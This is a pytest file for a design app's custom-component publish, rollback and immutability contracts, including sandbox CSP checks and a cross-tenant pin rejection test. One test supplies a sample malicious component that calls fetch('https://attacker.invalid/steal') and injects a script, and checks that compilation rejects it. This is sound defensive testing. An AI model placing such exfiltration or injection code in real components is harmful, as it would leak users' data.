"""P6.5 immutable custom-component export/publish/rollback contracts."""

from __future__ import annotations

import hashlib
import json
import re
from html.parser import HTMLParser
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from conftest import is_served, make_client, published_html, published_manifest
from sqlalchemy import text as sa_text
from sqlalchemy.exc import DBAPIError

from lumen_api.design_store import HybridRepository
from lumen_api.main import create_app


INTERACTIVE_SOURCE = """
import React, { useState } from "react";

type Props = {
  label: string;
  start?: number;
};

export const meta = {
  name: "Interactive Counter",
  description: "A deterministic publish and rollback fixture."
};

export default function InteractiveCounter({
  props: { label, start = 0 }
}: {
  props: Props;
  theme: { colors: Record<string, string> };
  overrideVariables?: Record<string, string>;
}) {
  const [count, setCount] = useState(start);
  return (
    <section className="rounded-xl bg-light p-6 text-dark">
      <h2>{label}</h2>
      <p aria-live="polite">{count}</p>
      <button type="button" onClick={() => setCount((value) => value + 1)}>
        Increase
      </button>
      <small>Artifact version one</small>
    </section>
  );
}
"""

INTERACTIVE_SOURCE_V2 = INTERACTIVE_SOURCE.replace(
    "Artifact version one", "Artifact version two"
)

CURATED_SOURCE = """
import React, { useRef } from "react";
import { LinePath } from "@visx/shape";
import { curveMonotoneX } from "@visx/curve";
import { Group } from "@visx/group";
import { scaleLinear } from "@visx/scale";
import { motion } from "motion/react";
import gsap from "gsap";
import { useGSAP } from "@gsap/react";

const points = [{ x: 0, y: 10 }, { x: 1, y: 40 }];

export const meta = {
  name: "Curated Motion Chart",
  description: "Visx, Motion, and GSAP delivery fixture."
};

export default function CuratedChart() {
  const ref = useRef<HTMLDivElement>(null);
  const x = scaleLinear({ domain: [0, 1], range: [0, 100] });
  useGSAP(() => {
    if (ref.current) gsap.to(ref.current, { opacity: 1 });
  }, { scope: ref });
  return (
    <motion.div ref={ref} initial={false} animate={{ opacity: 1 }} className="p-4">
      <strong>Responsive account trend</strong>
      <svg viewBox="0 0 120 60" role="img" aria-label="Account trend">
        <Group left={10} top={10}>
          <LinePath
            data={points}
            x={(d: { x: number; y: number }) => x(d.x)}
            y={(d: { x: number; y: number }) => d.y}
            curve={curveMonotoneX}
          />
        </Group>
      </svg>
    </motion.div>
  );
}
"""


class RuntimeFrameParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.frames: list[dict[str, str | None]] = []

    def handle_starttag(
        self, tag: str, attrs: list[tuple[str, str | None]]
    ) -> None:
        if tag == "iframe":
            record = dict(attrs)
            if record.get("data-lumen-custom-component-runtime") == "true":
                self.frames.append(record)


@pytest.fixture()
def client(tmp_path: Path, design_storage) -> TestClient:
    return make_client(create_app(tmp_path / "engine-cache", storage=design_storage))


def create_account(client: TestClient, account_id: str = "acc_publish") -> None:
    response = client.post(
        "/web/accounts",
        json={"account_id": account_id, "name": account_id},
    )
    assert response.status_code == 200, response.text


def compile_source(
    client: TestClient,
    *,
    slug: str,
    source: str,
    expected_version: int,
) -> dict:
    written = client.put(
        f"/web/accounts/acc_publish/custom-components/{slug}/source",
        json={
            "expected_version": expected_version,
            "files": {f"{slug}.tsx": source},
        },
    )
    assert written.status_code == 200, written.text
    source_version = written.json()["source"]["source_version"]
    compiled = client.post(
        f"/web/accounts/acc_publish/custom-components/{slug}/compile",
        json={"source_version": source_version},
    )
    assert compiled.status_code == 200, compiled.text
    assert compiled.json()["compilation"]["status"] == "succeeded", compiled.text
    return compiled.json()["artifact"]


def create_dialog_document(client: TestClient, document_id: str) -> dict:
    web_doc = client.app.state.core.web_new_doc(
        document_id, "Interactive delivery", None
    )["web_doc"]
    ingested = client.app.state.core.web_ingest_html(
        web_doc,
        "home",
        """
        <section id="host" class="min-h-screen bg-light p-8">
          <a id="open_dialog" data-button="primary" data-command="show-modal"
             data-target="demo_dialog">Open counter</a>
          <div data-component="dialog" id="demo_dialog"
               data-aria-label="Interactive counter">
            <div id="dialog_body" class="w-full max-w-[560px] p-4">
              <p>Server dialog fallback</p>
            </div>
          </div>
        </section>
        """,
    )
    assert ingested.get("web_doc"), ingested
    repository = HybridRepository()
    return repository.create_document(
        ingested["web_doc"],
        doc_kind="web",
        account_id="acc_publish",
    )


def attach_component(
    client: TestClient,
    document_id: str,
    artifact: dict,
    *,
    node_id: str = "cc_counter",
    parent: str = "dialog_body",
) -> int:
    document = client.get(f"/documents/{document_id}").json()
    response = client.post(
        f"/documents/{document_id}/web/operations",
        json={
            "base_version": document["current_version"],
            "intent": "attach immutable interactive component",
            "operations": [
                {
                    "kind": "insert_node",
                    "page_id": "home",
                    "parent": parent,
                    "index": 1,
                    "nodes": [
                        {
                            "id": node_id,
                            "kind": "custom_component",
                            "slug": artifact["slug"],
                            "artifact_id": artifact["artifact_id"],
                            "props": {"label": "Published counter", "start": 4},
                            "classes": "w-full min-h-[220px]",
                        }
                    ],
                    "root": node_id,
                }
            ],
        },
    )
    assert response.status_code == 200, response.text
    return response.json()["document"]["current_version"]


def repin_component(
    client: TestClient,
    document_id: str,
    artifact: dict,
    *,
    node_id: str = "cc_counter",
) -> int:
    document = client.get(f"/documents/{document_id}").json()
    response = client.post(
        f"/documents/{document_id}/web/operations",
        json={
            "base_version": document["current_version"],
            "intent": "explicitly repin one component node",
            "operations": [
                {
                    "kind": "set_node_props",
                    "page_id": "home",
                    "id": node_id,
                    "props": {
                        "kind": "custom_component",
                        "slug": artifact["slug"],
                        "artifact_id": artifact["artifact_id"],
                        "props": {
                            "label": "Published counter",
                            "start": 4,
                        },
                    },
                }
            ],
        },
    )
    assert response.status_code == 200, response.text
    return response.json()["document"]["current_version"]


def runtime_frame(html: str) -> dict[str, str | None]:
    parser = RuntimeFrameParser()
    parser.feed(html)
    assert len(parser.frames) == 1
    return parser.frames[0]


def publish(client: TestClient, document_id: str, slug: str) -> dict:
    response = client.post(
        f"/documents/{document_id}/web/publish",
        json={"slug": slug},
    )
    assert response.status_code == 200, response.text
    return response.json()


def test_publish_is_immutable_repin_scoped_and_rollback_exact(
    client: TestClient, workspace_id: str
) -> None:
    create_account(client)
    artifact_v1 = compile_source(
        client,
        slug="interactive-counter",
        source=INTERACTIVE_SOURCE,
        expected_version=0,
    )
    document = create_dialog_document(client, "doc_publish_primary")
    sibling = create_dialog_document(client, "doc_publish_sibling")
    attach_component(client, document["id"], artifact_v1)
    attach_component(client, sibling["id"], artifact_v1)

    first = publish(client, document["id"], "interactive-primary")
    sibling_publish = publish(client, sibling["id"], "interactive-sibling")
    first_html = published_html(workspace_id, "interactive-primary")
    sibling_html = published_html(workspace_id, "interactive-sibling")
    first_manifest = published_manifest(workspace_id, "interactive-primary")

    assert first["publish_id"].startswith("webpub_")
    assert first["package_digest"]
    assert first["manifest_digest"]
    assert first["html_digest"]
    assert first_manifest["schema_version"] == 2
    assert first_manifest["custom_components"]["components"] == [
        {
            "artifact_id": artifact_v1["artifact_id"],
            "node_id": "cc_counter",
            "props_digest": first_manifest["custom_components"]["components"][0][
                "props_digest"
            ],
            "runtime_nonce": first_manifest["custom_components"]["components"][0][
                "runtime_nonce"
            ],
            "slug": "interactive-counter",
        }
    ]
    assert "Artifact version one" in str(runtime_frame(first_html)["srcdoc"])
    assert "<dialog" in first_html
    assert 'command="show-modal"' in first_html

    artifact_v2 = compile_source(
        client,
        slug="interactive-counter",
        source=INTERACTIVE_SOURCE_V2,
        expected_version=1,
    )
    # Compiling a newer durable source does not consult or change either live
    # publish. Both still serve the exact first immutable revision.
    assert published_html(workspace_id, "interactive-primary") == first_html
    assert published_html(workspace_id, "interactive-sibling") == sibling_html

    repin_component(client, document["id"], artifact_v2)
    republished = publish(client, document["id"], "interactive-primary")
    second_html = published_html(workspace_id, "interactive-primary")
    assert republished["publish_id"] != first["publish_id"]
    assert republished["package_digest"] != first["package_digest"]
    assert "Artifact version two" in str(runtime_frame(second_html)["srcdoc"])
    assert published_html(workspace_id, "interactive-sibling") == sibling_html
    assert (
        client.get("/documents/doc_publish_sibling/web/publish").json()[
            "publish_id"
        ]
        == sibling_publish["publish_id"]
    )

    rolled = client.post("/web/publishes/interactive-primary/rollback")
    assert rolled.status_code == 200, rolled.text
    assert rolled.json()["publish_id"] == first["publish_id"]
    assert rolled.json()["package_digest"] == first["package_digest"]
    assert rolled.json()["html_digest"] == first["html_digest"]
    assert published_html(workspace_id, "interactive-primary") == first_html
    assert published_manifest(workspace_id, "interactive-primary") == first_manifest

    unpublished = client.delete("/web/publishes/interactive-primary")
    assert unpublished.status_code == 200
    assert not is_served(workspace_id, "interactive-primary")
    reactivated = publish(client, document["id"], "interactive-primary")
    assert reactivated["publish_id"] != first["publish_id"]
    assert is_served(workspace_id, "interactive-primary")


def test_publish_manifest_assets_csp_and_curated_packages(
    client: TestClient, workspace_id: str
) -> None:
    create_account(client)
    interactive = compile_source(
        client,
        slug="interactive-counter",
        source=INTERACTIVE_SOURCE,
        expected_version=0,
    )
    document = create_dialog_document(client, "doc_delivery_security")
    attach_component(client, document["id"], interactive)
    published = publish(client, document["id"], "delivery-security")

    page_html = published_html(workspace_id, "delivery-security")
    manifest = published_manifest(workspace_id, "delivery-security")
    frame = runtime_frame(page_html)
    srcdoc = str(frame["srcdoc"])

    # The DELIVERED page's response headers (ETag, the delivery CSP) are the page origin's
    # contract now, pinned by tests/page_origin/test_routes.py. What this test owns is the
    # PACKAGE those headers are computed FROM: the recorded digest really does describe the
    # recorded html (the ETag's whole basis), and the embedded runtime frame carries its sandbox.
    assert published["html_digest"] == hashlib.sha256(page_html.encode("utf-8")).hexdigest()
    assert "connect-src 'none'" in srcdoc
    assert "worker-src 'none'" in srcdoc
    assert "frame-src 'none'" in srcdoc
    assert "form-action 'none'" in srcdoc
    assert "Artifact version one" in srcdoc
    assert srcdoc.index("Artifact version one") < srcdoc.index('type="module"')
    assert "web-editor-bridge" not in page_html
    assert "data-custom-component-editor" not in frame

    asset_records = manifest["custom_components"]["assets"]
    assert asset_records
    assert any("react-runtime-host" in item["roles"] for item in asset_records)
    assert any(
        role.startswith("artifact-bundle:")
        for item in asset_records
        for role in item["roles"]
    )
    assert any(
        role.startswith("artifact-css:")
        for item in asset_records
        for role in item["roles"]
    )
    assert any(
        role.startswith("server-first-frame:")
        for item in asset_records
        for role in item["roles"]
    )
    # Serving those assets — the immutable cache headers, the digest/extension integrity
    # refusals — belongs to the page origin and is pinned by tests/page_origin/test_routes.py
    # (test_publish_assets_are_integrity_checked_and_immutable). Here the manifest RECORD is
    # the subject: each asset names its digest, extension and byte length.
    for record in asset_records:
        assert re.fullmatch(r"[0-9a-f]{64}", record["digest"]), record
        assert record["byte_length"] > 0
        assert record["url"].endswith(f"{record['digest']}.{record['extension']}")
    assert manifest["custom_components"]["components"][0]["artifact_id"] == interactive[
        "artifact_id"
    ]

    curated = compile_source(
        client,
        slug="curated-motion-chart",
        source=CURATED_SOURCE,
        expected_version=0,
    )
    curated_manifest = curated["manifest"]
    assert curated_manifest["curated_package_versions"]["motion"]
    assert curated_manifest["curated_package_versions"]["gsap"]
    assert curated_manifest["curated_package_versions"]["@visx/shape"]


def test_publish_rejects_unresolved_tenant_pin_and_malicious_source(
    client: TestClient, workspace_id: str
) -> None:
    create_account(client)
    create_account(client, "acc_other")
    foreign_source = client.put(
        "/web/accounts/acc_other/custom-components/foreign-card/source",
        json={
            "expected_version": 0,
            "files": {
                "foreign-card.tsx": (
                    'import React from "react";'
                    "export default function Foreign(){"
                    "return <div>Foreign private bytes</div>}"
                )
            },
        },
    )
    assert foreign_source.status_code == 200
    foreign_compile = client.post(
        "/web/accounts/acc_other/custom-components/foreign-card/compile",
        json={"source_version": 1},
    )
    assert foreign_compile.status_code == 200
    foreign = foreign_compile.json()["artifact"]

    document = create_dialog_document(client, "doc_tenant_attack")
    own = compile_source(
        client,
        slug="interactive-counter",
        source=INTERACTIVE_SOURCE,
        expected_version=0,
    )
    attach_component(client, document["id"], own)
    repository = HybridRepository()
    stored = repository.require_document(document["id"])
    scene = stored["scene"]
    scene["pages"][0]["nodes"]["cc_counter"]["slug"] = "foreign-card"
    scene["pages"][0]["nodes"]["cc_counter"]["artifact_id"] = foreign[
        "artifact_id"
    ]
    scene["pages"][0]["nodes"]["cc_counter"]["props"] = {}
    # Simulate corrupted storage below the checked-operation boundary. The
    # publish builder must still enforce tenant resolution. Reaching into
    # `_bridge` is deliberate: the write must land BELOW the operation
    # boundary, and documents now live on Postgres (not SQLite).
    repository._bridge._run(
        lambda conn: conn.execute(
            sa_text(
                "UPDATE design_document SET current_scene_json = CAST(:s AS jsonb)"
                " WHERE id = :d AND workspace_id = :w"
            ),
            {
                "s": json.dumps(scene),
                "d": document["id"],
                "w": repository.workspace_id,
            },
        )
    )
    # The corruption must actually be at rest — a zero-row UPDATE would
    # silently turn this whole test into a no-op.
    corrupted = repository.require_document(document["id"])
    corrupted_node = corrupted["scene"]["pages"][0]["nodes"]["cc_counter"]
    assert corrupted_node["slug"] == "foreign-card"
    assert corrupted_node["artifact_id"] == foreign["artifact_id"]
    rejected = client.post(
        f"/documents/{document['id']}/web/publish",
        json={"slug": "tenant-attack"},
    )
    assert rejected.status_code == 502
    assert "artifact_missing" in rejected.text
    assert not is_served(workspace_id, "tenant-attack")

    malicious = client.put(
        "/web/accounts/acc_publish/custom-components/unsafe-card/source",
        json={
            "expected_version": 0,
            "files": {
                "unsafe-card.tsx": (
                    'import React from "react";'
                    "export default function Unsafe(){"
                    'fetch("https://attacker.invalid/steal");'
                    'return <div dangerouslySetInnerHTML={{__html:"<script>bad</script>"}} />'
                    "}"
                )
            },
        },
    )
    assert malicious.status_code == 200
    compile_response = client.post(
        "/web/accounts/acc_publish/custom-components/unsafe-card/compile",
        json={"source_version": 1},
    )
    assert compile_response.status_code == 422
    assert compile_response.json()["compilation"]["status"] == "failed"
    assert compile_response.json()["artifact"] is None


def test_publish_revision_rows_are_immutable(client: TestClient) -> None:
    create_account(client)
    artifact = compile_source(
        client,
        slug="interactive-counter",
        source=INTERACTIVE_SOURCE,
        expected_version=0,
    )
    document = create_dialog_document(client, "doc_revision_immutable")
    attach_component(client, document["id"], artifact)
    published = publish(client, document["id"], "immutable-revision")

    # D2.4B: publish history lives on Postgres and stays append-only — enforced by the
    # design_web_publish_revision no-UPDATE / no-DELETE TRIGGERS instead of the old SQLite ones.
    # Reaching into `_bridge` is deliberate: the mutation must be attempted straight at the
    # table, below the API boundary. Each `_run` is its own transaction, so the refusal rolls
    # itself back.
    repository = HybridRepository()
    for mutation in (
        "UPDATE design_web_publish_revision SET html = 'tampered'"
        " WHERE publish_id = :p AND workspace_id = :w",
        "DELETE FROM design_web_publish_revision"
        " WHERE publish_id = :p AND workspace_id = :w",
    ):
        with pytest.raises(DBAPIError, match="immutable|append-only"):
            repository._bridge._run(
                lambda conn, sql=mutation: conn.execute(
                    sa_text(sql),
                    {
                        "p": published["publish_id"],
                        "w": repository.workspace_id,
                    },
                )
            )
